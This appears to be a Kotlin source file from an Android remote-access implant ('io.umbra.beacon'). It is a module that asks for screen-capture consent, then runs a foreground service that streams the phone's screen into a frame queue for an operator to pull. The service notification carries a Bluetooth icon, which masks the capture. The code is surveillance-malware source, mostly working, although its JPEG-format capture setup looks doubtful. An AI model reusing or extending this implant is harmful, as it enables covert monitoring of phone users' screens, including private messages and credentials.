package io.umbra.beacon

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.util.DisplayMetrics
import android.view.WindowManager
import android.content.pm.ServiceInfo

/**
 * The screen of the phone, as a picture and as a stream.
 *
 * The capture of the screen is the one capability the platform never
 * gives away: the user of the phone has to press the button of the
 * system dialog, every time the capture starts.  The implant does not
 * pretend otherwise -- it opens the dialog, and the answer says that the
 * user has to press it.
 *
 * Once the user pressed it, the projection is a stream of pictures: the
 * virtual display of the platform draws the screen into a reader, and the
 * reader hands the pictures to the implant.
 */
object Projection {
    /** The consent of the user, kept until the projection is built. */
    @Volatile var consent: Intent? = null

    /** The state of the projection, in words. */
    @Volatile var state: String = "the capture of the screen was never asked for"

    /** How many pictures the queue keeps. */
    const val MAX_FRAMES = 60

    /** The pictures that were captured. */
    private val frames = ArrayDeque<ByteArray>()

    /** The pictures, newest last. */
    @Synchronized
    fun push(frame: ByteArray) {
        while (frames.size >= MAX_FRAMES) frames.removeFirst()
        frames.addLast(frame)
    }

    /** Take one picture out of the queue, if there is one. */
    @Synchronized
    fun take(): ByteArray? = frames.removeFirstOrNull()

    /** Take every picture out of the queue. */
    @Synchronized
    fun drain(limit: Int): List<ByteArray> {
        val out = mutableListOf<ByteArray>()
        while (out.size < limit) {
            val frame = frames.removeFirstOrNull() ?: break
            out.add(frame)
        }
        return out
    }

    /** How many pictures the queue holds. */
    @Synchronized
    fun queued(): Int = frames.size

    /**
     * Wait for one picture.
     *
     * The queue is polled, not latched: a latch that fires once is of no
     * use to a task that asks for the second picture.
     */
    fun await(timeoutMs: Long): ByteArray? {
        val until = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < until) {
            val frame = take()
            if (frame != null) return frame
            Thread.sleep(100)
        }
        return null
    }

    /** Throw the queue away. */
    @Synchronized
    fun clear() {
        frames.clear()
    }
}

/**
 * The screen that asks the user for the capture of the screen.
 *
 * The dialog of the platform belongs to the system: the implant opens it
 * and the user of the phone presses the button.  What the user pressed
 * travels to the service, and the answer of the phone says which one it
 * was.
 */
class ProjectionActivity : Activity() {
    companion object {
        /** The request code of the consent. */
        const val REQUEST = 4715
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val manager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
        if (manager == null) {
            Projection.state = "the phone has no capture service for the screen"
            finish()
            return
        }
        try {
            startActivityForResult(manager.createScreenCaptureIntent(), REQUEST)
        } catch (t: Throwable) {
            Projection.state = "the capture of the screen could not be asked for: ${t.message}"
            finish()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode != REQUEST) {
            finish()
            return
        }
        if (resultCode == Activity.RESULT_OK && data != null) {
            Projection.consent = data
            Projection.state = "the user of the phone allowed the capture of the screen"
            ProjectionService.start(this, data, 2)
        } else {
            Projection.state = "the user of the phone refused the capture of the screen"
        }
        finish()
    }
}

/**
 * The service that holds the capture of the screen.
 *
 * The platform asks for a foreground service of the type
 * "mediaProjection" before the capture may start, and the notification
 * of that service is on the screen of the user while it runs.  The
 * implant does not hide it: a capture that the user cannot see is a
 * capture the user cannot stop.
 */
class ProjectionService : Service() {
    companion object {
        /** The channel of the notification. */
        const val CHANNEL_ID = "umbra-projection"

        /** The notification of the service. */
        const val NOTIFICATION_ID = 4713

        /** The action that stops the capture. */
        const val ACTION_STOP = "io.umbra.beacon.PROJECTION_STOP"

        /** The consent of the user, in the intent of the service. */
        const val EXTRA_CONSENT = "consent"

        /** How many pictures a second the operator asked for. */
        const val EXTRA_FPS = "fps"

        /** Start the capture with the consent of the user. */
        fun start(context: Context, consent: Intent, fps: Int) {
            val intent = Intent(context, ProjectionService::class.java)
            intent.putExtra(EXTRA_CONSENT, consent)
            intent.putExtra(EXTRA_FPS, fps)
            try {
                context.startForegroundService(intent)
            } catch (t: Throwable) {
                Projection.state = "the capture service could not be started: ${t.message}"
            }
        }

        /** Stop the capture. */
        fun stop(context: Context) {
            val intent = Intent(context, ProjectionService::class.java)
            intent.action = ACTION_STOP
            try {
                context.startService(intent)
            } catch (_: IllegalStateException) {
                context.stopService(Intent(context, ProjectionService::class.java))
            }
        }
    }

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var reader: ImageReader? = null
    private var handler: Handler? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        // The capture of the screen is a foreground service of its own
        // type, and the platform wants the type to be announced before
        // the projection is built.
        val text = "the screen of the phone is captured"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification(text),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION,
            )
        } else {
            startForeground(NOTIFICATION_ID, notification(text))
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            release()
            stopForeground(true)
            stopSelf()
            return START_NOT_STICKY
        }
        if (projection == null) {
            build(intent)
        }
        return START_STICKY
    }

    /**
     * Build the projection.
     *
     * The order matters: on Android 14 the callback of the projection has
     * to be registered before the virtual display is created, or the
     * system throws.
     */
    private fun build(intent: Intent?) {
        val consent = intent?.getParcelableExtra(EXTRA_CONSENT, Intent::class.java) ?: run {
            Projection.state = "the capture of the screen has no consent"
            return
        }
        val fps = (intent?.getIntExtra(EXTRA_FPS, 2) ?: 2).coerceIn(1, 10)
        val manager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
        if (manager == null) {
            Projection.state = "the phone has no capture service for the screen"
            return
        }
        val metrics = DisplayMetrics()
        val window = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
        try {
            val display = window?.defaultDisplay
            display?.getRealMetrics(metrics)
        } catch (t: Throwable) {
            // The metrics stay at their default.
        }
        val width = if (metrics.widthPixels > 0) metrics.widthPixels else 1080
        val height = if (metrics.heightPixels > 0) metrics.heightPixels else 1920
        val thread = HandlerThread("umbra-projection")
        thread.start()
        val worker = Handler(thread.looper)
        handler = worker
        return try {
            val active = manager.getMediaProjection(Activity.RESULT_OK, consent)
            if (active == null) {
                Projection.state = "the projection of the screen could not be built"
                return
            }
            active.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Projection.state = "the capture of the screen was stopped by the system"
                    release()
                }
            }, worker)
            projection = active
            val images = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
            reader = images
            val minimum = 1000L / fps
            var last = 0L
            images.setOnImageAvailableListener({ source ->
                val image = source.acquireNextImage() ?: return@setOnImageAvailableListener
                try {
                    val now = System.currentTimeMillis()
                    if (now - last < minimum) return@setOnImageAvailableListener
                    last = now
                    val buffer = image.planes[0].buffer
                    val data = ByteArray(buffer.remaining())
                    buffer.get(data)
                    Projection.push(data)
                } catch (_: Throwable) {
                    // A picture that cannot be read is dropped.
                } finally {
                    image.close()
                }
            }, worker)
            val screen = active.createVirtualDisplay(
                "umbra-screen",
                width,
                height,
                metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                images.surface,
                null,
                worker,
            )
            virtualDisplay = screen
            Projection.state = "the screen of the phone is captured at $fps pictures a second"
        } catch (t: Throwable) {
            Projection.state = "the projection of the screen failed: ${t.message ?: "the system refused"}"
        }
    }

    /** Let the projection go. */
    private fun release() {
        try {
            virtualDisplay?.release()
        } catch (_: Throwable) {
            // The display was already gone.
        }
        virtualDisplay = null
        try {
            reader?.close()
        } catch (_: Throwable) {
            // The reader was already closed.
        }
        reader = null
        try {
            projection?.stop()
        } catch (_: Throwable) {
            // The projection was already stopped.
        }
        projection = null
    }

    override fun onDestroy() {
        release()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): android.os.IBinder? = null

    /** The channel of the notification of the capture. */
    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val channel = NotificationChannel(
            CHANNEL_ID,
            "the capture of the screen",
            NotificationManager.IMPORTANCE_LOW,
        )
        manager.createNotificationChannel(channel)
    }

    /** The notification of the capture. */
    private fun notification(text: String): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setContentTitle(getString(R.string.app_name))
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
            .setOngoing(true)
            .build()
    }
}
